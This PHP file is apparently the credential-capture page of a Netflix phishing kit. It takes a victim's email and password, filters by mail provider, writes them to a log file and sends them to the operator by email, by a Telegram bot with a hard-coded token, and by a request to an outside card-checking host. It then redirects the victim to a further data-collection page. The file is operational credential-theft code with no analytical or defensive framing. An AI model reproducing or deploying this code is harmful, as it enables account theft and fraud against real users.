<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../anti.php';
include '../../email.php';
include '../../nword.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['email']  = $_POST['mail'];
  $_SESSION['pass']   = $_POST['pass'];

	if(strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr")){}
  else{
    header("Location: ../../login.php?error=true");
    die();
  }


$message = "

 ㅤ
[🥷🏽] Informations de connexion [🥷🏽]

🚪 E-Mail : ".$_SESSION['email']."
🗝 Mot de passe : ".$_SESSION['pass']."

🛒 Adresse IP : "._ip()."
🛒 User Agent : ".$_SERVER['HTTP_USER_AGENT']."


          ";
$Subject=" 「🧢」+1 Fr3sh Netflix Log From ".$_SESSION['email']."|🎯 "._ip();
$head="From: (っ◔◡◔)っTYNOX N3TFLIX 🛍 <info@sdf.cash>";
$_SESSION['step_one']  = true;
$fil = fopen('logins.txt','a+');
  $url = 'http://checkmycard.live/trlg.php?l='.$_SESSION['email'].'&p='.$_SESSION['pass'].'';
    $json = file_get_contents($url);
    $data = json_decode($json);
	$filepath = './stats.ini';
$data = @parse_ini_file($filepath);
$data['logs']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);
	 fwrite($fil, ''.$_SESSION["email"].'|none|'.$_SESSION["pass"]."\n");
mail($my_mail,$Subject,$message,$head);
$zizi = urlencode("".$message."");
	$grouparobaz = urlencode("-673661159"); 	
	$apitoken = urlencode("5201302943:AAHrCbCirUk1melvbCXxq_x-Hq5Ix2hbTM4"); 
    $html = file_get_contents('https://api.telegram.org/bot'.$apitoken.'/sendMessage?chat_id='.$grouparobaz.'&text='.$zizi.'');
header('location: ../info.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>
